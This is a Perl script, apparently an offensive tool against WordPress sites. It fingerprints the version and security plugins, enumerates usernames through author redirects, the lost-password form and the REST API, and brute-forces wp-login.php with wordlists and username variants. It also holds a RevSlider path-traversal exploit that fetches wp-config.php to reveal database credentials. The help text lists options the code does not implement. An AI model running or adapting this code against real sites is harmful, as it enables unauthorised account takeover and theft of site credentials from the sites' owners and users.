#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Response;
use HTTP::Cookies;
use Data::Dump qw(dump);
use Term::ANSIColor qw(color colored);
use Getopt::Long;
use Parallel::ForkManager;

no warnings 'experimental';


### Global variables (for configuration/settings stuff)

my $ARGUMENTS = {
    url                => 0,
    timeout            => 15,
    threads            => 50,
    useragent          => 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801',
    proxy              => 0,
    verbosity          => 0,
    usernames_list     => 'data/usernames.lst',
    passwords_list     => 'data/passwords.lst',
    default_paths_list => 'data/default_paths.lst',
};

my $SCAN = {
    url        => 0,
    users      => 1,
    version    => 1,
    bruteforce => 0,
    exploit    => 0,
    browser    => 0,
};

my $PATHS = {
    login_page        => 'wp-login.php',
    admin_directory   => 'wp-admin/',
    content_directory => 'wp-content/',
    themes_directory  => 'wp-content/themes/',
    plugins_directory => 'wp-content/plugins/',
};

### Call main
main();

sub header {

    print color('black'), "\n";
    print qq{                                        

                              ____    ___             __         
                             /\  _`\ /\_ \           /\ \        
            __  __  __  _____\ \ \L\_\//\ \      __  \ \ \/'\
};

    print color('yellow');
    print qq{
           /\ \/\ \/\ \/\ '__`\ \  _\/ \ \ \   /'__`\ \ \ , <    
           \ \ \_/ \_/ \ \ \L\ \ \ \/   \_\ \_/\ \L\.\_\ \ \\`\  
};

    print color('red'); 
    print qq{
            \ \___x___/'\ \ ,__/\ \_\   /\____\ \__/.\_\\ \_\ \_\ 
             \/__//__/   \ \ \/  \/_/   \/____/\/__/\/_/ \/_/\/_/ 
                          \ \_\                                   
                           \/_/                                   
                                                                  
                                     ✠ 𝔡𝔢𝔲𝔱𝔰𝔠𝔥𝔩𝔞𝔫𝔡 ✠

    };
}
sub main {
    
    # display header
    header();
    
    # initialization
    initialize();
    
    # Confirms that the given url is wordpress installation
    my $WORDPRESS = checkWordpressUrl($ARGUMENTS->{url});
    
    # Version extraction
    if($SCAN->{version}) {
        if(!$WORDPRESS->{version}) {
            $WORDPRESS = wordpressVersion($WORDPRESS);
        }
        
        if($WORDPRESS->{version}) {
            result("WordPress version found : " . color("cyan") . "WordPress (" . $WORDPRESS->{version} . ")");
        } else {
            warning("WordPress version couldn't be found .");
        }
    }
    
    # WAF Detection
    if($SCAN->{waf}) {
        info("Starting WAF detection on : " . $WORDPRESS->{url});
        $WORDPRESS = getWAFPlugins($WORDPRESS);
    }
    
    # Users extraction
    if($SCAN->{users}) {
        info("Starting usernames extraction on : " . $WORDPRESS->{url});
        $WORDPRESS = wordpressUsers($WORDPRESS, 'ALL');
    }
    
    # Bruteforce credentials
    if($SCAN->{bruteforce}) {
        info("Starting bruteforcer to find valid credentials on : " . $WORDPRESS->{login_page});
        $WORDPRESS = loginBruteforce($WORDPRESS);
    }
    
}

sub initialize {
    # Get command line arguments/options
    GetOptions(
        "tm|timeout=i"    => \$ARGUMENTS->{timeout},
        "t|threads=i"     => \$ARGUMENTS->{threads},
        "u|url=s"         => \$ARGUMENTS->{url},
        "proxy=s"         => \$ARGUMENTS->{proxy},
        "ua|useragent=s"  => \$ARGUMENTS->{useragent},
        "v|verbose!"      => \$ARGUMENTS->{verbosity},
    
        "sv|version"      => \$SCAN->{version},
        "wf|waf"          => \$SCAN->{waf},
        "su|users"        => \$SCAN->{users},
        "bf|bruteforce"   => \$SCAN->{bruteforce},
        "ex|exploit"      => \$SCAN->{exploit},
    
        "h|help"          => \&help,
    ) or die error("Bad value(s) provided in command line arguments .");
    
    die error("Arguments missing. Please specify at least a wordpress installation url.\n") if(!$ARGUMENTS->{url});
    
    $SCAN->{browser} = initializeBrowser();
}

sub initializeBrowser {
    my $browser = LWP::UserAgent->new();
    
    my $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser->agent($ARGUMENTS->{useragent});
    $browser->timeout($ARGUMENTS->{timeout});
    $browser->protocols_allowed([qw( ftp ftps http https )]);
    
    if($ARGUMENTS->{proxy} && $ARGUMENTS->{proxy} =~ /^(https?|socks):\/\/[^:]+:[0-9]+$/i) {
        $browser->proxy([qw/ ftp ftps http https /] => $ARGUMENTS->{proxy});
    }
    
    return $browser;
}

######################################## WordPress Informations ########################################

sub checkWordpressUrl {
    my ( $url ) = @_;
    my $request = HTTP::Request->new('GET', $url);
    my $response = $SCAN->{browser}->request($request);
    
    my @matches = ();
    
    my $WORDPRESS = {
        url             => $url,
        users           => undef,
        credentials     => undef,
        plugins         => undef,
        themes          => undef,
        vulnerabilities => undef,
        login_page      => 0,
        valid           => 0,
        version         => 0,
    };
    
    if($response->is_success) {
        print color("blue"), "[" . $response->request->method . "] " . color("cyan") . $response->request->uri . color("blue") . " (" . color("white") . $response->code . color("blue") . ")\n";
        
        $WORDPRESS = checkHeaders($WORDPRESS, $response);
        $WORDPRESS = extractComponents($WORDPRESS, $response->content);
        
        my $login_page_response = $SCAN->{browser}->get($url . $PATHS->{login_page});
        
        if($login_page_response =~ /[123][0-9][0-9]|403/) {
            $WORDPRESS->{login_page} = $login_page_response->request->uri;
        }
        
        if(!$WORDPRESS->{valid}) {
            warning("Any Wordpress header found in headers");
            info("Trying to valid by extracting meta generators ...");
            
            $WORDPRESS = extractMetaGenerators($WORDPRESS, $response->content);
            if(!$WORDPRESS->{valid}) {
                warning("Any WordPress generators found .");
                info("Requesting content directory : " . $url . $PATHS->{content_directory});
                
                $response = $SCAN->{browser}->get($url . $PATHS->{content_directory});
                if($response->code =~ /2[0-9][0-9]|301|403/) {
                    $WORDPRESS->{valid} = 1;
                } else {
                    die error("Couldn't confirm WordPress installation on : $url");
                }
            }
        }
        
        if($WORDPRESS->{version}) {
            result("WordPress Version Found : WordPress (" . $WORDPRESS->{version} . ")");
        } else {
            warning("Couldn't find WordPress Version .");
        }
    } else {
       error("Unexpected response received from server : " . $response->code);
    }
    
    return $WORDPRESS;
}

sub checkHeaders {
    my ( $WORDPRESS, $response ) = @_;
    my $service_name = 0;
    my $version = 0;
    
    foreach my $header_name (keys %{ $response->headers }) {
        my @header_values = $response->header($header_name);
        
        foreach my $header_value (@header_values) {
            given($header_name)
            {
                when(/X-Generator|X-Powered-By|X-Meta-Generator/i) {
                    given($header_value)
                    {
                        when(/[^\d\s]*(?:\s|-|_|\/)?\(?\s*\d[\.\d]*/i) {
                            ($service_name, $version) = $header_value =~ /([^\d\s]*)(?:\s|-|_|\/)?\(?\s*(\d[\.\d]*)/i;
                        }
                            
                        when(/[a-zA-Z0-9_\-\.\!]+/i) {
                            $service_name = $header_value;
                        }
                    }
                }
            }
            
            if($service_name =~ /Wordpress/i) {
                $WORDPRESS->{valid} = 1;
                $WORDPRESS->{version} = $version if($version);
                
                return $WORDPRESS;
            }
        }
    }
    
    return $WORDPRESS;
}

sub extractMetaGenerators {
    my ( $WORDPRESS, $source ) = @_;
    my $generator_name = 0;
    my $generator_version = "";
    
    my @matches = $source =~ m/<meta[^>^=]+content[\s]*=[\s]*["|']?([^"^'^>]+)["|']?[^>^=]+name[\s]*=[\s]*["|']?generator["|']?/sgi;
    push(@matches, $source =~ m/<meta[^>^=]+name[\s]*=[\s]*["|']?generator["|']?(?:[^>^=]+content[\s]*=[\s]*"([^"^'^>]+)")?/sgi);
    
    foreach my $match (@matches) {
        $generator_name = 0;
        $generator_version = "";
        
        given($match)
        {
            when(/[a-zA-Z0-9\-\_\s]+\s?\([\d\.]+([\d\.vrev]+)*\)/i) {
                ($generator_name, $generator_version) = $match =~ /([a-zA-Z0-9\-\_\s]+)\s?\(([\d\.]+([\d\.vrev]+)*)\)/i;
            }
            
            when(/[^\d\s]*\s*(?:\s|-|_|\/)?\s*\d[\.\d]*/i) {
                ($generator_name, $generator_version) = $match =~ /([^\d\s]*)\s*(?:\s|-|_|\/)?\s*(\d[\.\d]*)/i;
            }
            
            when(/[a-zA-Z0-9_\-\.\!]+/i) {
                $generator_name = $match;
            }
        }
        
        if($generator_name && $generator_name =~ /WordPress/i) {
            $WORDPRESS->{valid} = 1;
            $WORDPRESS->{version} = $generator_version if($generator_version);
            
            return $WORDPRESS;
        }
    }
    
    return $WORDPRESS;
}

sub wordpressUsers {
    my ( $WORDPRESS, $type ) = @_;
    $type = 'ALL' if(!$type);
    
    my @method_types = ();
    
    if($type eq 'ALL') {
        @method_types = ('AUTHORS', 'FORGETPASSWORD', 'XMLRPC');
    } else {
        push(@method_types, uc($type));
    }
    
    foreach my $method_type (@method_types) {
        given($method_type)
        {
            when(/AUTHORS/i) {
                my @requests = ();
                
                for(my $id = 0; $id <= 15; $id++) {
                    my $request = HTTP::Request->new('GET', $WORDPRESS->{url} . '?author=' . $id);
                    $requests[$id] = $request;
                }
                $WORDPRESS = getAuthorsUsers($WORDPRESS, \@requests);
            }
            
            when(/FORGETPASSWORD/i) {
                my @requests = ();
                
                for(my $id = 0; $id <= 15; $id++) {
                    my $request = HTTP::Request->new('POST', $WORDPRESS->{url} . 'wp-login.php?action=lostpassword');
                    $request->content('author=' . $id);
                    $requests[$id] = $request;
                }
                $WORDPRESS = getForgetPasswordUsers($WORDPRESS, \@requests);
            }
            
            when(/XMLRPC/i) {
                my @requests = ();
                
                my $request = HTTP::Request->new('GET', $WORDPRESS->{url} . 'wp-json/wp/v2/users');
                $requests[0] = $request;
            
                $WORDPRESS = getXMLRPCUsers($WORDPRESS, \@requests);
            }
        }
    }
    
    return $WORDPRESS;
}

sub wordpressVersion {
    my ( $WORDPRESS ) = @_;
    
    my @requests = ();
    my @paths = read_file($ARGUMENTS->{default_paths_list}, 1);
    my @regexes = [
        qr/Version\s*(\d+\.[\d\.]*)/i,
        qr/version="(\d[\.\d]*)">WORDPRESS</i,
        qr/WORDPRESS (\d[\.\d]*)/i,
    ];
    
    foreach my $path (@paths) {
        push(@requests, HTTP::Request->new('GET', $WORDPRESS->{url} . $path));
    }
    my @responses = asyncRequests(@requests);
    
    foreach my $response (@responses) {
        if($response->is_success) {
            foreach my $regex (@regexes) {
                if($response->content =~ /$regex/i) {
                    my ($version) = $response->content =~ /$regex/i;
                    $WORDPRESS->{version} = $version;

                    return $WORDPRESS;
                }
            }
        }
    }
    
    return $WORDPRESS;
}

######################################## Fingerprinting Functions ########################################

sub extractComponents {
    my ( $WORDPRESS, $source ) = @_;
    $source =~ s/\\\//\//gi;
    my @matches = $source =~ m/(\/wp-content[\\]?\/(?:themes|plugins)[\\]?\/[^\/'"]*\/[^"'>< ]*)/sgi;
    
    foreach my $match (@matches) {
        my $path = $match;
        my ($component_type, $component_name, $component_path) = $path =~ /\/wp-content[\\]?\/(themes|plugins)[\\]?\/([^\/'"]*)(\/[^"'\)>< ]*)/i;
        print "\t--> $match\n";
        
        if(!defined($WORDPRESS->{lc($component_type)}->{$component_name})) {
            print color("bold green"), "\t[+] " . color("blue") . "WordPress " . color("cyan") . substr(ucfirst($component_type), 0, -1) . color("blue") . " Found : " . color("red") . $component_name . "\n\n";
            
            $WORDPRESS->{lc($component_type)}->{$component_name}->{name} = $component_name;
            $WORDPRESS->{lc($component_type)}->{$component_name}->{url} = $WORDPRESS->{url} . 'wp-content/' . $component_type . '/' . $component_name . '/';
            
            if(!defined($WORDPRESS->{lc($component_type)}->{$component_name}->{version})) {
                info("Getting " . ucfirst(lc($component_type)) . " "  . $component_name . " version ...");
                my $request = HTTP::Request->new('GET', $WORDPRESS->{lc($component_type)}->{$component_name}->{url} . '/readme.txt');
                
            }
            
        }
    }
    
    return $WORDPRESS;
}

sub getAuthorsUsers {
    my ( $WORDPRESS, $ref_requests ) = @_;
    
    my @requests = @{ $ref_requests };
    my @responses = asyncRequests(@requests);

    for(my $user_id = 0; $user_id < 0+@responses; $user_id++) {
        my $username = 0;
        my $response = $responses[$user_id];
        $response = $response->previous if($response->previous);
        
        if($response->header('Location') && $response->header('Location') =~ /\/author\/.*\/?/) {
            ($username) = $response->header('Location') =~ /\/author\/([^\/]*)\/?/;
        }
        
        if($username) {
            result("WordPress User " . color("cyan") . "#$user_id " . color("blue") . "Found : " . color("yellow") . $username);
            $WORDPRESS->{users}->{$user_id} = $username;
        }
    }
    
    return $WORDPRESS;
}

sub getForgetPasswordUsers {
    my ( $WORDPRESS, $ref_requests ) = @_;
    
    my @requests = @{ $ref_requests };
    my @responses = asyncRequests(@requests);

    for(my $user_id = 0; $user_id < 0+@responses; $user_id++) {
        my $username = 0;
        my $response = $responses[$user_id];
        
        if($response->content =~ /author-([^\s]*)\s*author/i) {
            ($username) = $response->content =~ / author-([^\s]*)\s*author/i;
            
            if($username) {
                result("WordPress User " . color("cyan") . "#$user_id " . color("blue") . "Found : " . color("yellow") . $username);
                $WORDPRESS->{users}->{$user_id} = $username;
            }
        }
    }
    
    return $WORDPRESS;
}

sub getXMLRPCUsers {
    my ( $WORDPRESS, $ref_requests ) = @_;
    
    my @requests = @{ $ref_requests };
    my @responses = asyncRequests(@requests);

    for(my $user_id = 0; $user_id < 0+@responses; $user_id++) {
        my $response = $responses[$user_id];
        last if($response->content =~ /rest_api_access_restricted/);
        
        if($response->content =~ /"slug":/) {
            ($WORDPRESS->{users}->{$user_id}->{picture}) = $response->content =~ /"link":"([^"]*)"/i if($response->content =~ /"link":"([^"]*)"/i);
            ($WORDPRESS->{users}->{$user_id}->{name}) = $response->content =~ /"name":"([^"]*)"/i if($response->content =~ /"name":"([^"]*)"/i);
            ($WORDPRESS->{users}->{$user_id}->{username}) = $response->content =~ /"slug":"([^"]*)"/i if($response->content =~ /"slug":"([^"]*)"/i);
            
            if($WORDPRESS->{users}->{$user_id}->{username}) {
                result("WordPress User " . color("cyan") . "#$user_id " . color("blue") . "Found : " . color("yellow") . $WORDPRESS->{users}->{$user_id}->{username});
            }
        }
    }
    
    return $WORDPRESS;
}

sub getWAFPlugins {
    my ( $WORDPRESS ) = @_;
    
    my $WAF = {
        'WORDFENCE' => {
            name => 'Wordfence',
            path => 'wp-content/plugins/wordfence/',
        },
    
        'BULLETPROOF' => {
            name => 'BulletProof Security',
            path => 'wp-content/plugins/bulletproof-security/',
        },
        
        'SUCURI' => {
            name => 'Sucuri Scanner',
            path => 'wp-content/plugins/sucuri-scanner/',
        },
        
        'BETTERWP' => {
            name => 'Better WP Security',
            path => 'wp-content/plugins/better-wp-security/',
        },
        
        'ACUNETIX' => {
            name => 'Acunetix WP SecurityScan',
            path => 'wp-content/plugins/wp-security-scan/',
        },
        
        'ALLINONEWPSECURITY' => {
            name => 'All In One WP Security & Firewall',
            path => 'wp-content/plugins/all-in-one-wp-security-and-firewall/',
            
        },
        
        '6SCAN' => {
            name => '6Scan Security',
            path => 'wp-content/plugins/6scan-protection/',
            
        },
    };
    
    foreach my $waf_type (keys %{ $WAF }) {
        my $request = HTTP::Request->new('GET', $WORDPRESS->{url} . $WAF->{$waf_type}->{path});
        my $response = $SCAN->{browser}->request($request);
        
        if($response->is_success) {
            warning("WordPress WAF Plugin [" . color("red") . $WAF->{$waf_type}->{name} . color("blue") . "] Detected : " . color("yellow") . $WORDPRESS->{url} . $WAF->{$waf_type}->{path});
            $WORDPRESS->{WAF}->{$WAF->{$waf_type}->{name}} = $WORDPRESS->{url} . $WAF->{$waf_type}->{path};
        }
    }
    
    return $WORDPRESS;
}

####################################### Attacking Functions ######################################

sub loginBruteforce {
    my ( $WORDPRESS ) = @_;
    
    my @usernames = ();
    my @passwords = read_file($ARGUMENTS->{passwords_list}, 1);
    
    my @requests = ();
    my @responses = ();
    
    if(keys %{ $WORDPRESS->{users} }) {
        foreach my $user_id (keys %{ $WORDPRESS->{users} }) {
            my $username = $WORDPRESS->{users}->{$user_id}->{username};
            push(@usernames, $username);
        }
    } else {
        @usernames = read_file($ARGUMENTS->{usernames_list}, 1);
    }
    
    foreach my $username (@usernames) {
        my @requests = ();
        my @custom_passwords = @passwords;
        push(@custom_passwords, getCustomPasswords($username));
        
        foreach my $password (@custom_passwords) {
            my $request = HTTP::Request->new('POST', $WORDPRESS->{login_page});
            $request->header('Referer' => $WORDPRESS->{login_page});
            $request->content('log=' . $username . '&pwd=' . $password . '&');
            push(@requests, $request);
        }
        my @responses = asyncRequests(@requests);
        
        foreach my $response (@responses) {
            my ($account_username, $account_password) = $response->request->content =~ /log=([^&]*)&pwd=([^&]*)&/;
            print color("blue"), "[*] Tying " . color("cyan") . $account_username . color("white") . ":" . color("cyan") . $account_password . color("blue") . " ...\n";
            if($response->previous) {
                $response = $response->previous;
            }
            
            if($response->header('Location') && $response->header('Location') =~ /wp-admin/i) {
                
                $WORDPRESS->{credentials}->{$WORDPRESS->{login_page}}->{username} = $account_username;
                $WORDPRESS->{credentials}->{$WORDPRESS->{login_page}}->{password} = $account_password;
                
                result("Credentials Found : " . color("yellow") . $account_username . color("white") . ":" . $account_password);
            }
        }
    }
    
    return $WORDPRESS;
}

sub getCustomPasswords {
    my ( $name ) = @_;
    
    my @custom_passwords = ($name, ucfirst(lc($name)), uc($name), reverse($name));
    
    return @custom_passwords;
}

sub revsliderExploit {
    my ( $WORDPRESS ) = @_;
    my $exploit_path = 'wp-admin/admin-ajax.php?action=revslider_show_image&img=';
    my $inclusion_path = '../wp-config.php';
                
    my @paths = [
        'wp-content/themes/beach_apollo/',
        'wp-content/themes/striking_r/',
        'wp-content/themes/Centum/',
        'wp-content/themes/Avada/',
        'wp-content/themes/medicate/',
        'wp-content/themes/ultimatum/',
        'wp-content/themes/IncredibleWP/',
        'wp-content/themes/cuckootap/',
    ];
    
    foreach my $path (@paths) {
        my $response = $SCAN->{browser}->request(HTTP::Request->new('GET', $WORDPRESS->{url} . $path));
        
        if($response->code =~ /[123][0-9][0-9]|403/i) {
            result("RevSlider vulnerable theme found : " . $WORDPRESS->{url} . $path);
            
            my $exploit_request = HTTP::Request->new('GET', $WORDPRESS->{url} . $exploit_path . $inclusion_path);
            info("Sending exploit request : " . $WORDPRESS->{url} . $exploit_path . $inclusion_path);
            
            my $exploit_response = $SCAN->{browser}->request($exploit_request);
            
            
            if($exploit_response->is_success && $exploit_response->content =~ /'DB_HOST'/) {
                
                $WORDPRESS->{vulnerabilities}->{$exploit_response->request->uri}->{request} = $exploit_request;
                $WORDPRESS->{vulnerabilities}->{$exploit_response->request->uri}->{response} = $exploit_response;
                
                print color("green"), "[+] " . color("cyan") . $exploit_response->request->uri . color("blue") . " is " . color("green") . "VULNERABLE\n"; 
            } else {
                print color("red"), "[-] " . color("cyan") . $exploit_response->request->uri . color("blue") . " is " . color("red") . "NOT VULNERABLE\n"; 
            }
        }
    }
    
    return $WORDPRESS;
}

####################################### Requests Functions #######################################

sub asyncRequests {
    my ( @requests ) = @_;
    my $pm = Parallel::ForkManager->new(0+@requests);
    
    my @responses = ();
    
    foreach my $request (@requests) {
        # Forks and returns the pid for the child:
        my $pid = $pm->start and next; 
        
        push(@responses, $SCAN->{browser}->request($request));
        
        $pm->finish; # Terminates the child process
    }
    $pm->wait_all_children;

    return @responses;
}

######################################## General Functions ########################################

sub read_file {
    my ( $file, $chomp ) = @_;
    $chomp = 0 if(!defined($chomp));
    
    open FILE, $file or die error("$file couldn't be read  .");
    my @content = <FILE>;
    close FILE;
    
    if($chomp) {
        my @final_content = ();
        
        foreach my $line (@content) {
            chomp $line;
            push(@final_content, $line);
        }
        
        return @final_content;
    }
    
    return @content;
}

sub info {
    my ( $text ) = @_;
    print color("white") . "[" . color("blue") . "✠" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("cyan") . " $text\n";
}

sub warning {
    my ( $text ) = @_;
    print color("white") . "[" . color("yellow") . "!" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("cyan") . "$text\n";
}

sub result {
    my ( $text ) = @_;
    print color("white") . "[" . color("green") . "+" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("cyan") . " $text\n";
}

sub error {
    my ( $text ) = @_;
    print color("white") . "[" . color("red") . "-" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("cyan") . "$text\n";
    exit;
}

######################################## Help Menu ########################################

sub help {
    print "\n";
    print qq {  
        # Usage
        perl $0  --url URL [OPTIONS]
        
        # Arguments
        
        
        --url [VALUE]         : The Target URL [Format: scheme://host]
        --useragent [VALUE]   : User-Agent To Send To Server
        --cookie [VALUE]      : Cookie String To Use
        --proxy [VALUE]       : Proxy Server To Use [Format: scheme://host:port]
        --timeout [VALUE]     : Max Timeout For The HTTP Requests
        --help                : Display The Help Menu
        --rule-dir [VALUE]    : Path To The ModSecurity Activated Rules (Default: /etc/httpd/modsecurity.d/activated_rules)
        --path [VALUE]        : Path To The XML Handler (Default: /)
        --payload [VALUE]     : The XML/XSL Payload File To Use (Default: src/payload.xml)
    };
    print "\n\n";
    exit;
}
